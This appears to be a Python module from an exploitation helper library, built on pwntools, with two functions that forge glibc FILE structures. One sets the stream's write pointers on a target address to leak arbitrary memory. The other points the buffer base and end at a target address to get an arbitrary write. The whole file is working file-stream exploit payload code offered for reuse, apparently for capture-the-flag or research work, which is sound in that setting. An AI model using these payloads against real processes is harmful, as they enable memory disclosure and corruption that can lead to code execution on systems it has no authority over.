from ..Utils.pwntools_import import FileStructure


def FILE_read_payload(target_addr: int, size: int, buf_addr: int):
    f = FileStructure()
    f.flags, f.fileno = 0xFBAD0800, 1
    f._IO_write_base, f._IO_write_ptr, f._IO_write_end = target_addr, target_addr + size, 0
    f._IO_read_end = target_addr
    f._lock = buf_addr

    return bytes(f)[:-8]



def FILE_write_payload(target_addr: int, size: int, buf_addr: int):
    f = FileStructure()
    f.flags, f.fileno = 0xFBAD0000, 0
    f._IO_read_ptr = f._IO_read_end = 0
    f._IO_buf_base, f._IO_buf_end = target_addr, target_addr + size
    f._lock = buf_addr

    return bytes(f)[:-8]

